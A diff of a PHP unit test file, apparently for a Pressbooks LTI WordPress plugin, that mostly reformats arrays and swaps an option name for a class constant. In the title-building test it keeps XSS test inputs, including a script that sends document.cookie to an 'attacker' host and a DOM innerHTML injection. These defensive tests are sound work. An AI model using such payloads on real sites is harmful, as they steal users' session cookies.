@@ -107,7 +107,7 @@ class ToolTest extends \WP_UnitTestCase {
 				'user_nicename' => $edge_user,
 				'first_name'    => 'FirstName',
 				'last_name'     => 'LastName',
-				'display_name'  => 'FirstName LastName'
+				'display_name'  => 'FirstName LastName',
 			]
 		);
 
@@ -134,7 +134,6 @@ class ToolTest extends \WP_UnitTestCase {
 
 		// Existing user was recognized and linked
 		$this->assertInstanceOf( '\WP_User', $this->tool->matchUserById( $lti_id2 ) );
-
 	}
 
 	public function test_authenticateUser() {
@@ -221,7 +220,7 @@ class ToolTest extends \WP_UnitTestCase {
 			'<script>window.location=\'http://attacker/?cookie=\'+document.cookie</script>',
 			'<script>var keyword = location.search.substring(6);document.querySelector("em").innerHTML=keyword;)</script>',
 			'<script>bad.js</script>',
-			'123'
+			'123',
 		];
 		$this->assertEquals( 'Course Name 657: Read this book!', $this->tool->buildTitle( $happy_path[0], $happy_path[1], $happy_path[2], $happy_path[3] ) );
 		$this->assertEquals( 'Course ID 4321: Activity ID 1234', $this->tool->buildTitle( $empty_path1[0], $empty_path1[1], $empty_path1[2], $empty_path1[3] ) );
@@ -235,7 +234,12 @@ class ToolTest extends \WP_UnitTestCase {
 		$obj     = get_blog_details( $blog_id );
 		$exists  = $obj->siteurl;
 
-		update_option( 'pressbooks_lti_consumer_context', [ 'resource_link_id' => 33, 'context_id' => 2 ] );
+		update_option(
+			$this->tool::CONSUMER_CONTEXT_KEY, [
+				'resource_link_id' => 33,
+				'context_id' => 2,
+			]
+		);
 		$no_exist           = [ 'https://pressbooks.test/activityname', 33, 2 ];
 		$no_url             = [ 'noHostHere', 33, 2 ];
 		$different_resource = [ $exists, 34, 2 ];
@@ -248,7 +252,7 @@ class ToolTest extends \WP_UnitTestCase {
 		$this->assertFalse( $this->tool->validateLtiBookExists( $different_course[0], $different_course[1], $different_course[2] ) );
 		$this->assertTrue( $this->tool->validateLtiBookExists( $happy_path[0], $happy_path[1], $happy_path[2] ) );
 
-		delete_option( 'pressbooks_lti_consumer_context' );
+		delete_option( $this->tool::CONSUMER_CONTEXT_KEY );
 		$this->tool->validateLtiBookExists( $happy_path[0], $happy_path[1], $happy_path[2] );
 		$this->assertArrayHasKey( 'context_id', get_option( 'pressbooks_lti_consumer_context' ) );
 
@@ -280,7 +284,10 @@ class ToolTest extends \WP_UnitTestCase {
 	}
 
 	public function test_processRequest() {
-		$params = [ 'hello' => 'world', 'foo' => 'bar' ];
+		$params = [
+			'hello' => 'world',
+			'foo' => 'bar',
+		];
 		$this->tool->processRequest( $params );
 		$this->assertTrue( array_key_exists( 'hello', $this->tool->getParams() ) );
 		$_POST['lti_message_type'] = 'ToolProxyRegistrationRequest';
